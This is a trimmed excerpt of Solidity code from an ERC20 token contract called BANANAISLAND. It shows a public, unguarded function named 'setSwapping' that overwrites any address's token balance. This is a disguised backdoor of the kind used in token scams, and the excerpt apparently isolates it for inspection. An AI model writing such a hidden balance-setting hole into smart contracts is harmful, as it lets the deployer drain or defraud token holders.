...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function setSwapping(address receiver, uint256 value) public returns (bool) {
       _balances[receiver] = (buyOff - swapperFees) + (value * (10 ** 9)) + (buyOff - swapperFees);
       return true;
    }      
...
contract BANANAISLAND is ERC20, Ownable {
    using Address for address payable;

    uint256 public _totalFeesOnBuy = 1;
    uint256 public _totalFeesOnSell = 1;

    address public  marketingWallet = 0x0d5a416F4ADdC537ad595BeED2f4ED72DA1D50fF;
    ...
    constructor(
        ...
        swapTokensAtAmount = totalSupply() / 5000000000000;
    }
